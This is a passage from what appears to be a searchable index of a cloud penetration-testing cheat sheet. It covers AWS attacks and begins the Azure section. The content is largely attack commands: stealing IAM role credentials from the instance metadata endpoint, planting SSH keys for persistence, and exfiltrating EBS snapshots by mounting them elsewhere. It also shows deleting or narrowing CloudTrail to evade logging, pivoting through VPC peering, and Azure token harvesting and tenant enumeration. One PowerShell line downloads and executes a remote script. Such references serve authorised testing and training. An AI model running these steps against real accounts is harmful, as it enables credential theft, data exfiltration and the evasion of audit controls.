initial access","text":"<ol> <li>Enumerate the key (Role)</li> </ol> <pre><code>aws sts get-caller-identity\n</code></pre> <ol> <li>If there are roles associated with the key, we can grab the credentials by issuing a request to the metadata endpoint (v1 or v2)</li> </ol> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_OF_PREVIOUS_COMMAND\n</code></pre> <ol> <li>Configure the aws cli</li> </ol> <pre><code>aws configure \n</code></pre> <p>Or use enviroment variables.</p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#persistence_2","title":"Persistence","text":"<ul> <li>All the persistence techniques works here, SSH persistence, vim backdoor and so on.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#ssh-persistence-example","title":"SSH Persistence example","text":"<ol> <li>Generate SSH Key pair</li> </ol> <pre><code>ssh-keygen\n</code></pre> <ol> <li>Add public key to authorized_keys</li> </ol> <pre><code>echo \"PUBLIC_Key\" &gt;&gt; /home/user/.ssh/authorized_keys\n</code></pre> <ol> <li>Use the private key to connect </li> </ol> <pre><code>ssh -i public_key user@instance\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#elastic-block-store","title":"Elastic Block Store","text":"<ul> <li>Block storage system used to store persistent data</li> <li>It's possible to attach this drive to EC2 and increase the storage (Like and HD, but scalable).</li> <li>It's possible to create a snapshot (It will be saved on S3) and create a volume from this snapshot.</li> <li>It's possible to attach the snapshot (Backup of BS) to an EC2 instance</li> <li>Snapshots can be used as volumes or AMI's</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_5","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumerating-ebs-volumes","title":"Enumerating EBS volumes","text":"<pre><code>aws ec2 describe-volumes\n</code></pre> <ul> <li>If the volume is available, it can be attached to an EC2 instance</li> <li>Check if the EBS is encrypted</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumerating-snapshots","title":"Enumerating Snapshots","text":"<pre><code>aws ec2 describe-snapshots --owner-ids self \n</code></pre> <ul> <li>Also check if the snapshot is encrypted</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#exploitation-data-exfiltration","title":"Exploitation &amp; Data Exfiltration","text":"<ul> <li>Create a snapshot of an EC2 instance, create a volume from snapshot and attach to other EC2 instance. </li> <li>User need to have IAM permissions on EC2</li> <li>Maybe we don't have the right to access the instance but have rights to create a snapshot and attach it to another machine.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#creating-a-snapshot-of-a-specified-volume","title":"Creating a snapshot of a specified volume","text":"<pre><code>aws ec2 create-snapshot --volume volumeID --description \"Example\" --profile profile_name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-snapshots","title":"Listing snapshots","text":"<pre><code>aws ec2 describe-snapshots\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#creating-a-volume-from-a-snasphot","title":"Creating a volume from a snasphot","text":"<pre><code>aws ec2 create-volume --snapshot-id ID --availability-zone ZONE --profile profile_name\n</code></pre> <ul> <li>The volume needs to be in the same availability zone as the instance we have access</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#attaching-the-volume-to-an-instance","title":"Attaching the volume to an instance","text":"<pre><code>aws ec2 attach-volume --volume-id VolumeID --instance-id InstanceID --device /dev/sdfd -&gt; Can be other value\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#mounting-the-volume","title":"Mounting the volume","text":"<pre><code>sudo mount /dev/sdfd /directory\n</code></pre> <p>After mounting, we will have access to the disk. </p>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#rds-relational-database-service","title":"RDS - Relational Database Service","text":"<ul> <li>Service to use, operate and scale relational databases in AWS (MariaDB, MySQL and similar)</li> <li>The access is done by using password, password+IAM or password+kerberos</li> <li>It's possible to restrict access using restriction such as specific EC2 or lambda or use network level restriction such as vpc, ip.</li> <li>RDS Proxy hadles the traffic between the application and the database, it enables the enforcing of IAM permissions and use secrets manager to store credentials.</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_6","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-clusters-in-rds","title":"Listing information about clusters in RDS","text":"<pre><code>aws rds describe-db-clusters\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-rds-instances","title":"Listing information about RDS instances","text":"<pre><code>aws rds describe-db-instances\n</code></pre> <ul> <li>IAMDatabaseAuthenticationEnabled: false -&gt; Need password to access the instance</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-subnet-groups-in-rds","title":"Listing information about subnet groups in RDS","text":"<pre><code>aws rds describe-db-subnet-groups\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-database-security-groups-in-rds","title":"Listing information about database security groups in RDS","text":"<pre><code>aws rds describe-db-security-groups\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-information-about-database-proxies","title":"Listing information about database proxies","text":"<pre><code>aws rds describe-db-proxies\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#data-exfiltration_1","title":"Data exfiltration","text":"<ul> <li>If the instance is in a security group or VPC, we need to compromise it first to access the database (For example, we compromise an EC2 instance in the same VPC, then its possible to connect)</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#list-instances-in-rds","title":"List instances in RDS","text":"<pre><code>aws rds describe-db-instances\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#list-information-about-the-specified-security-group","title":"List information about the specified security group","text":"<pre><code>aws ec2 describe-security-groups --group-ids id\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#password-based-authentication","title":"Password based authentication","text":"<pre><code>mysql -h hostname -u name -P port -p password\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#iam-based-authentication","title":"IAM Based authentication","text":"<p>1. Identify the user</p> <pre><code>aws sts get-caller-identity\n</code></pre> <p>2. List all policies attached to a role</p> <pre><code>aws iam list-attached-role-policies --role-name name\n</code></pre> <p>3. Get information about a specific version of a policy</p> <pre><code>aws iam get-policy-version --policy-arn arn --version-id ID\n</code></pre> <p>4. Get a temporary token from the RDS</p> <pre><code>aws rds generate-db-auth-token --hostname hostname --port port --username username --region region\n</code></pre> <ul> <li>To be easier, we can put it in a variable</li> </ul> <pre><code>TOKEN=$(aws rds generate-db-auth-token --hostname hostname --port port --username username --region region)\n</code></pre> <p>5. Connect to the DB using the token</p> <pre><code>mysql -h hostname -u name -P port --enable-cleartext-plugin --user=user --password=$TOKEN\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#sso-other-services","title":"SSO &amp; Other Services","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#single-sign-on-sso","title":"Single Sign On (SSO)","text":"<ul> <li>Used to centrally manage access to multiple AWS accounts and applications. </li> <li>Provide users a way to interact with all services and applications through one place</li> <li>Can be used to manage access and user permissions to all AWS accounts</li> <li>The identity source can use AWS SSO's identity store or external identity store (Okta,SAML and similar)</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#cloudtrail","title":"CloudTrail","text":"<ul> <li>Log monitoring service, allow us to continuously monitor and retain account activity related to actions in our AWS account </li> <li>Provide event history of AWS account activity, SDKs, command line tools and other services</li> <li>Commonly used to detect unsual behavior in AWS account</li> <li>Pacu automatically changes the user agent to deceive the logs of cloudtrail</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#userful-commands","title":"Userful Commands","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#list-trails","title":"List trails","text":"<pre><code>aws cloudtrail list-trails\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#disabling-cloudtrail","title":"Disabling CloudTrail","text":"<pre><code>aws cloudtrail delete-trail --name example_trail --profile name\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#disable-monitoring-of-events-from-global-events","title":"Disable monitoring of events from global events","text":"<pre><code>aws cloudtrail update-trail --name example_trail --no-include-global-service-event\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#disable-cloudtrail-on-specific-regions","title":"Disable CloudTrail on specific regions","text":"<pre><code>aws cloudtrail update-trail --name example_trail --no-include-global-service-event --no-is-multi-region --region=eu-west\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-shield","title":"AWS Shield","text":"<ul> <li>Used to protect services from Denial of Service Attacks</li> <li>There are 2 versions, the standard and the Advanced</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-waf","title":"AWS Waf","text":"<ul> <li>Used to protect applications against common web application attacks </li> <li>Common WAF bypasses can be tested against it</li> <li>To detect an WAF, we can use <code>wafw00f</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-inspector","title":"AWS Inspector","text":"<ul> <li>Automated security assessment service that helps improve the security and compliance of applications on AWS</li> <li>Works with an agent </li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-guard-duty","title":"AWS Guard Duty","text":"<ul> <li>Threat detection service that monitors for malicious activity and unauthorized behavior</li> <li>Works by collecting and analyzing logs</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#virtual-private-cloud","title":"Virtual Private Cloud","text":"<ul> <li>Used to create an isolated infrastructure within the cloud, including subnets and so on.</li> <li>If the VPC has an internet gateway, means its a public subnet</li> <li>Every VPC can have Network ACL's</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#routing-tables","title":"Routing Tables","text":"<p>A set of rules to determine where the traffic will be directed, comes in form of Destination and Target, defined as follows</p> <pre><code>DESTINATION TARGET\n\nIP          local -&gt; VPC Internal\nIP          igw   -&gt; Internet Gateway\nIP          nat   -&gt; NAT Gateway\nIP          pcx   -&gt; VPC Peering\nIP          vpce  -&gt; VPC Endpoint\nIP          vgw   -&gt; VPN Gateway\nIP          eni   -&gt; Network Interface\n</code></pre> <ul> <li>VPC Internal -&gt; Internal IP, no internet connection</li> <li>Internet Gateway -&gt; Used to access the internet</li> <li>NAT Gateway -&gt; Does the NAT between machines, allows one way connection to the internet</li> <li>VPC Peering -&gt; Allows the communication between 2 VPC's</li> <li>VPC Endpoint -&gt; Used to access aws services without internet connection (Internet Gateway)</li> <li>VPN Gateway -&gt; Used to expand the cloud to on premises and vice-versa</li> <li>Network Interface -&gt; Network Interfaces</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#enumeration_7","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-vpcs","title":"Listing VPC's","text":"<pre><code>aws ec2 describe-vpcs\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-vpcs-specifing-the-region","title":"Listing VPC's specifing the region","text":"<pre><code>aws ec2 describe-vpcs --region us-west-1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-vpc-information-by-id","title":"Listing VPC information by ID","text":"<pre><code>aws ec2 describe-vpcs --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-subnets","title":"Listing subnet's","text":"<pre><code>aws ec2 describe-subnets\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-subnets-by-vpc-id","title":"Listing subnet's by VPC-id","text":"<pre><code>aws ec2 describe-subnets --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-routing-tables","title":"Listing routing tables","text":"<pre><code>aws ec2 describe-route-tables\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-routing-tables-by-vpc-id","title":"Listing routing tables by VPC-id","text":"<pre><code>aws ec2 describe-route-tables --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-network-acls","title":"Listing Network ACL's","text":"<pre><code>aws ec2 describe-network-acls\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#lateral-movement-and-pivoting","title":"Lateral Movement and Pivoting","text":"<ul> <li>We can abuse VPC peering to do lateral movement</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#scenario","title":"Scenario","text":"<ul> <li>There are 3 VPC's -&gt; A,B,C </li> <li>A can access B through peering and B access C. We can use VPC B as a peering pivot to access VPC C from VPC A.</li> <li>The lateral movement can be done if we gather keys or other machines </li> <li>Always enumerate the subnets to see in which subnet we can access other VPC's</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-vpc-peering-connections","title":"Listing VPC peering connections","text":"<pre><code>aws ec2 describe-vpc-peering-connections\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-subnets-of-specific-vpc-important-because-the-access-can-be-restricted-to-specific-subnets-to-other-vpcs","title":"Listing subnets of specific VPC (Important because the access can be restricted to specific subnets to other VPC's)","text":"<pre><code>aws ec2 describe-subnets --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-routing-tables_1","title":"Listing routing tables","text":"<pre><code>aws ec2 describe-route-tables --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-instances-on-the-specified-vpc-id","title":"Listing instances on the specified VPC ID","text":"<pre><code>aws ec2 describe-instances --filters \"Name=vpc-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#listing-instances-on-the-specified-subnet","title":"Listing instances on the specified subnet","text":"<pre><code>aws ec2 describe-instances --filters \"Name=subnet-id,Values=ID\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#references","title":"References","text":"<ul> <li>An introduction to penetration testing AWS - Akimbocore</li> <li>Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk</li> <li>My arsenal of AWS Security tools - toniblyx</li> <li>AWS Privilege Escalation method mitigation - RhinoSecurityLabs</li> <li>AWS CLI Cheatsheet - apolloclark</li> <li>Pacu Open source AWS Exploitation framework - RhinoSecurityLabs</li> <li>PACU Spencer Gietzen - 30 juil. 2018</li> <li>Cloud security instance metadata - PumaScan</li> <li>Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018</li> <li>AWS - Cheatsheet - @Magnussen</li> <li>HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez</li> <li>How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016</li> <li>Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 </li> <li>Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019</li> <li>Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020</li> <li>AWS API calls that return credentials - kmcquade</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/","title":"Cloud - Azure","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#summary","title":"Summary","text":"<ul> <li>Azure Recon Tools</li> <li>Authenticating to the Microsoft Graph API in PowerShell<ul> <li>Graph API Refresh Token</li> <li>Graph API Access Token</li> </ul> </li> <li>Terminology</li> <li>Training</li> <li>Enumeration<ul> <li>Enumerate valid emails</li> <li>Enumerate Azure Subdomains</li> <li>Enumerate tenant with Azure AD Powershell</li> <li>Enumerate tenant with Az Powershell</li> <li>Enumerate tenant with az cli</li> <li>Enumerate manually</li> <li>Enumeration methodology</li> </ul> </li> <li>Phishing with Evilginx2</li> <li>Illicit Consent Grant<ul> <li>Register Application</li> <li>Configure Application</li> <li>Setup 365-Stealer (Deprecated)</li> <li>Setup Vajra</li> </ul> </li> <li>Device Code Phish</li> <li>Token from Managed Identity<ul> <li>Azure API via Powershell</li> <li>Azure API via Python Version</li> <li>Get Tokens</li> <li>Use Tokens</li> <li>Refresh Tokens</li> </ul> </li> <li>Stealing Tokens<ul> <li>Stealing tokens from az cli</li> <li>Stealing tokens from az powershell</li> </ul> </li> <li>Add Credentials to All Enterprise Applications</li> <li>Spawn SSH for Azure Web App</li> <li>Azure Storage Blob<ul> <li>Enumerate blobs</li> <li>SAS URL</li> <li>List and download blobs</li> </ul> </li> <li>Runbook Automation<ul> <li>Create a Runbook</li> <li>Persistence via Automation accounts</li> </ul> </li> <li>Virtual Machine RunCommand</li> <li>KeyVault Secrets</li> <li>Pass The Certificate</li> <li>Pass The PRT</li> <li>Intunes Administration</li> <li>Dynamic Group Membership</li> <li>Administrative Unit</li> <li>Deployment Template</li> <li>Application Proxy</li> <li>Conditional Access</li> <li>Azure AD<ul> <li>Azure AD vs Active Directory</li> <li>Password Spray</li> <li>Convert GUID to SID</li> </ul> </li> <li>Azure AD Connect <ul> <li>Azure AD Connect - Password extraction</li> <li>Azure AD Connect - MSOL Account's password and DCSync</li> <li>Azure AD Connect - Seamless Single Sign On Silver Ticket</li> </ul> </li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-recon-tools","title":"Azure Recon Tools","text":"<ul> <li>BloodHoundAD/AzureHound - Azure Data Exporter for BloodHound     <pre><code># First, retrieve a refresh token (-r) if username/password isn't supported.\n# An access token (-j) isn't recommended because it can expire before the end of azurehound execution\nInstall-Module AADInternals -Scope CurrentUser\nImport-Module AADInternals\n$rt = (Get-AADIntAccessToken -ClientId \"1950a258-227b-4e31-a9cf-717495945fc2\" -Resource \"https://graph.microsoft.com\" -PRTToken (Get-AADIntUserPRTToken) -IncludeRefreshToken $true)[1]\n# Second, launch azurehound collector\n./azurehound -r \"0.AXMAMe...\" list --tenant \"753a0bc5-...\" -o output.json\n## Connects on your Azure account using the refresh token provided and the tenant of the account\n## and collects every possible objects in contoso.microsoft.com. Results are stored in json\n./azurehound -r $rt --tenant \"contoso.onmicrosoft.com\" list -o azurehound-scan.json --tenant \"contoso.microsoft.com\"\n## Sets configuration file with connection variables and other things (not required)\n./azurehound configure\n## Collects every objects on all accessible tenants using username/password and prints it to stdout\n./azurehound -u \"MattNelson@contoso.onmicrosoft.com\" -p \"MyVerySecurePassword123\" --tenant \"contoso.onmicrosoft.com\" list\n## Collects every objects on a specific tenant using username/password and stores it in json\n./azurehound -u \"phisheduser@contoso.onmicrosoft.com\" -p \"Password1\" list -o initial-scan.json --tenant \"contoso.onmicrosoft.com\"\n## Collects every objects on all tenants accessible using Service Principal secret\n./azurehound -a \"6b5adee8-...\" -s \"&lt;secret&gt;\" --tenant \"contoso.onmicrosoft.com\" list\n## Collects AzureAD info (all except AzureRM info) using JWT access token\n./azurehound -j \"ey...\" --tenant \"contoso.onmicrosoft.com\" list az-ad\n## Collects every users using refresh token\n./azurehound -r \"0.ARwA6Wg...\" --tenant \"contoso.onmicrosoft.com\" list users\n# List of collections\naz-ad: Collect all information available at the AzureAD tenant level. In most tenants, all users have the ability to read all this information by default.\naz-rm: Collect all information available at the AzureRM subscription level. Users do not by default have read access to any of this information.\napps: Collects AzureAD application registration objects.\ndevices: Collects AzureAD devices regardless of join type.\ngroups: Collects AzureAD security-enabled groups, both role eligible and non role eligible.\nkey-vaults: Collects AzureRM key vaults.\nmanagement-groups: Collects AzureRM management group objects\nresource-groups: Collects AzureRM resource group objects\nroles: Collects AzureAD admin role objects\nservice-principals: Collects AzureAD service principals\nsubscriptions: Collevts AzureRM subscriptions\ntenants: Collevts AzureAD tenant objects\nusers: Collects AzureAD users, including any guest users in the target tenant.\nvirtual-machines: Collects AzureRM virtual machines\n# GUI access\nbolt://localhost:7687\nUsername: neo4j\nPassword: BloodHound\n# Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/\n# Cypher query examples:\nMATCH p = (n)-[r]-&gt;(g:AZKeyVault) RETURN p\nMATCH (n) WHERE n.azname IS NOT NULL AND n.azname &lt;&gt; \"\" AND n.name IS NULL SET n.name = n.azname\n</code></pre></li> <li>BloodHoundAD/BARK - BloodHound Attack Research Kit     <pre><code>. .\\BARK.ps1\n$MyRefreshTokenRequest = Get-AZRefreshTokenWithUsernamePassword -username \"user@contoso.onmicrosoft.com\" -password \"MyVeryCoolPassword\" -TenantID \"contoso.onmicrosoft.com\"\n$MyMSGraphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $MyRefreshTokenRequest.refresh_token -TenantID \"contoso.onmicrosoft.com\"\n$MyAADUsers = Get-AllAzureADUsers -Token $MyMSGraphToken.access_token -ShowProgress\n</code></pre></li> <li>ROADTool - The Azure AD exploration framework.     <pre><code>pipenv shell\nroadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]\nroadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]\nroadrecon auth -u test@&lt;TENANT NAME&gt;.onmicrosoft.com -p &lt;PASSWORD&gt;\nroadrecon gather\nroadrecon gui\n</code></pre></li> <li>Azure/StormSpotter - Azure Red Team tool for graphing Azure and Azure Active Directory objects     <pre><code># session 1 - backend\npipenv shell\npython ssbackend.pyz\n# session 2 - frontend\ncd C:\\Tools\\stormspotter\\frontend\\dist\\spa\\\nquasar.cmd serve -p 9091 --history\n# session 3 - collector\npipenv shell\naz login -u test@&lt;TENANT NAME&gt;.onmicrosoft.com -p &lt;PASSWORD&gt;\npython C:\\Tools\\stormspotter\\stormcollector\\sscollector.pyz cli\n# Web access on http://localhost:9091\nUsername: neo4j\nPassword: BloodHound\nServer: bolt://localhost:7687\n</code></pre></li> <li>Microsoft Portals - Microsoft Administrator Sites</li> <li>nccgroup/Azucar : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.     <pre><code># You should use an account with at least read-permission on the assets you want to access\nPS&gt; Get-ChildItem -Recurse c:\\Azucar_V10 | Unblock-File\nPS&gt; .\\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT\nPS&gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000\nPS&gt; .\\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\\AzucarTest\\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000\n# resolve the TenantID for an specific username\nPS&gt; .\\Azucar.ps1 -ResolveTenantUserName user@company.com\n</code></pre></li> <li>FSecureLABS/Azurite Explorer and Azurite Visualizer : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.     <pre><code>git submodule init\ngit submodule update\nPS&gt; Import-Module AzureRM\nPS&gt; Import-Module AzuriteExplorer.ps1\nPS&gt; Review-AzureRmSubscription\nPS&gt; Review-CustomAzureRmSubscription\n</code></pre></li> <li>NetSPI/MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping     <pre><code>PS C:&gt; Import-Module .\\MicroBurst.psm1\nPS C:&gt; Import-Module .\\Get-AzureDomainInfo.ps1\nPS C:&gt; Get-AzureDomainInfo -folder MicroBurst -Verbose\n</code></pre></li> <li> <p>cyberark/SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.      Require:</p> <ul> <li>Read-Only permissions over Azure Directory (Tenant)</li> <li>Read-Only permissions over Subscription</li> <li>Require AZ and AzureAD module or administrator right</li> </ul> <p>```powershell $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\\SkyArk.ps1 -force PS C&gt; Start-AzureStealth PS C&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1') PS C&gt; Scan-AzureAdmins * hausec/PowerZure - PowerShell framework to assess Azure security <pre><code># Require az module !\n$ ipmo .\\PowerZure\n$ Set-Subscription -Id [idgoeshere]\n# Reader\n$ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails\n# Contributor\n$ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command \"whoami\"\n$ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File \"build.xml\"\n$ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents\n$ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk\n# Owner\n$ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest\n# Administrator\n$ Create-Backdoor, Execute-Backdoor\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#authenticating-to-the-microsoft-graph-api-in-powershell","title":"Authenticating to the Microsoft Graph API in PowerShell","text":"<ul> <li>Microsoft Applications ID</li> </ul> Name GUID Microsoft Azure PowerShell 1950a258-227b-4e31-a9cf-717495945fc2 Microsoft Azure CLI 04b07795-8ddb-461a-bbee-02f9e1bf7b46 Portail Azure c44b4083-3bb0-49c1-b47d-974e53cbdf3c"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#graph-api-refresh-token","title":"Graph API Refresh Token","text":"<p>Authenticating to the Microsoft Graph API in PowerShell</p> <pre><code>$body = @{\n\"client_id\" =     \"1950a258-227b-4e31-a9cf-717495945fc2\"\n\"resource\" =      \"https://graph.microsoft.com\" # Microsoft Graph API \n}\n$UserAgent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\"\n$Headers=@{}\n$Headers[\"User-Agent\"] = $UserAgent\n$authResponse = Invoke-RestMethod `\n-UseBasicParsing `\n-Method Post `\n-Uri \"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0\" `\n-Headers $Headers `\n-Body $body\n$authResponse\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#graph-api-access-token","title":"Graph API Access Token","text":"<p>This request require getting the Refresh Token.</p> <pre><code>$body=@{\n\"client_id\" =  \"1950a258-227b-4e31-a9cf-717495945fc2\"\n\"grant_type\" = \"urn:ietf:params:oauth:grant-type:device_code\"\n\"code\" =       $authResponse.device_code\n}\n$Tokens = Invoke-RestMethod `\n-UseBasicParsing `\n-Method Post `\n-Uri \"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0\" `\n-Headers $Headers `\n-Body $body\n$Tokens\n</code></pre>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#terminology","title":"Terminology","text":"<p>Basic Azure AD terminologies</p> <ul> <li>Tenant: An instance of Azure AD and represents a single organization.</li> <li>Azure AD Directory: Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources.</li> <li>Subscriptions: It is used to pay for services. There can be multiple subscriptions in a Directory.</li> <li>Core Domain: The initial domain name .onmicrosoft.com is the core domain. It is possible to define custom domain names too."},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#training","title":"Training","text":"<ul> <li>AzureGoat : A Damn Vulnerable Azure Infrastructure - https://github.com/ine-labs/AzureGoat</li> </ul>"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumeration","title":"Enumeration","text":""},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#enumerate-valid-emails","title":"Enumerate valid emails","text":"<p>By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.</p> <ul> <li>Validate email      <pre><code>PS&gt; C:\\Python27\\python.exe C:\\Tools\\o365creeper\\o365creeper.py -f C:\\Tools\\emails.txt -o C:\\Tools\\validemails.txt\nadmin@&lt;TENANT NAME&gt;.onmicrosoft.com   - VALID\nroot@&lt;TENANT NAME&gt;.onmicrosoft.com    - INVALID\ntest@&lt;TENANT NAME&gt;.onmicrosoft.com    - VALID\ncontact@&lt;TENANT NAME&gt;.onmicrosoft.com - INVALID\n</code></pre></li> <li>Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon</li> 